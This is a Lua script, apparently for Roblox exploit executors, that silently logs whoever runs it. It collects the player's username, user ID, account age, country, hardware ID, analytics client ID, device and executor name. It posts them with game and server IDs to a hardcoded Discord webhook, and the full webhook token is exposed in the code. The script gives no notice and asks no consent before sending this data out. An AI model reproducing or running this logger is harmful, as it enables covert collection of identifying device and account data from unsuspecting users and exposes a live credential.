local webhook = "https://discord.com/api/webhooks/1279783612757053521/hW390WOiaIXJPEgWzDri_1e96l61TBFbEeAE_5QJE7Cvsf1Fd7HWd5cu-9DbRMvPjGWL"
local at_pingId = ""
local player = game:GetService("Players").LocalPlayer
local age = player.AccountAge
local uid = player.UserId
local displayName = player.DisplayName
local premium = player.MembershipType == Enum.MembershipType.Premium
local input = game:GetService("UserInputService")
local platformMap = {[Enum.Platform.Windows] = "Windows",[Enum.Platform.OSX] = "MacOS", [Enum.Platform.Android] = "Android", [Enum.Platform.IOS] = "iOS", [Enum.Platform.XBoxOne] = "Xbox", [Enum.Platform.UWP] = "UWP", [Enum.Platform.PS4] = "PS4"}
local device = platformMap[input:GetPlatform()] or "nil"
local hwid = "nil"
local clientId = "nil"
local injector = "nil"
local joinTime = os.time() - (age * 86400)
local joinDate = os.date("%Y-%m-%d", joinTime)
local execTime = os.date("%Y-%m-%d %H:%M:%S UTC")
local years = math.floor(age/365 * 100) / 100
local country = "nil"
local country, result = pcall(function() return game:GetService("LocalizationService"):GetCountryRegionForPlayerAsync(player) end)
if country and result then country = result end
pcall(function() hwid = gethwid() or hwid end)
pcall(function() clientId = game:GetService("RbxAnalyticsService"):GetClientId() or clientId end)
pcall(function() injector = identifyexecutor() or injector end)
local placeId = game.PlaceId
local jobId = game.JobId
local gameName = "nil"
local gameLink = "https://www.roblox.com/games/"..placeId
local ok, info = pcall(game.MarketplaceService.GetProductInfo, game.MarketplaceService, placeId)
if ok and info and info.Name then gameName = info.Name end
local avatar = "https://cdn.discordapp.com/attachments/868496249958060102/901884186267365396/ezgif-2-3c2a2bc53af1.gif"
local ok, data = pcall(game.HttpGet, game, string.format("https://thumbnails.roblox.com/v1/users/avatar?userIds=%d&size=180x180&format=Png&isCircular=true", uid))
if ok and data then
local http = game:GetService("HttpService")
local ok2, json = pcall(http.JSONDecode, http, data)
if ok2 and json and json.data and json.data[1] and json.data[1].imageUrl then
avatar = json.data[1].imageUrl;end;end
local content = at_pingId ~= "" and "<@"..at_pingId..">" or nil
local infoText = string.format("**玩家信息**\n`用户名:` %s\n`显示名:` %s\n`ID:` [%d](https://www.roblox.com/users/%d/profile)\n`账号年龄:` %d天 (%.2f年)\n`加入日期:` %s\n`会员:` %s\n`语言:` %s\n`国家:` %s\n\n".."**设备信息**\n`HWID:` %s\n`客户端ID:` %s\n`设备:` %s\n\n".."**游戏信息**\n`地图名:` %s\n`地图ID:` [%d](%s)\n`服务器ID:` %s\n`实例ID:` %s\n\n".."**执行信息**\n`注入器:` %s\n`执行时间:` %s",player.Name,displayName,uid,uid,age,years,joinDate,premium and "Premium用户"or"普通用户",player.LocaleId,country,hwid,clientId,device,gameName,placeId,gameLink,jobId,game.GameId,injector,execTime)
local request = http_request or request or HttpPost or syn.request
request({
Url = webhook,
Method = "POST",
Headers = {["Content-Type"] = "application/json"},
Body = game.HttpService:JSONEncode({
username = "通知",
avatar_url = "https://cdn.discordapp.com/attachments/868496249958060102/901884186267365396/ezgif-2-3c2a2bc53af1.gif",
content = content,
embeds = {{
color = 3342336,
title = "脚本已执行",
thumbnail = { url = avatar },
fields = {{ 
name = "📊 详细信息", 
value = infoText }};}};});})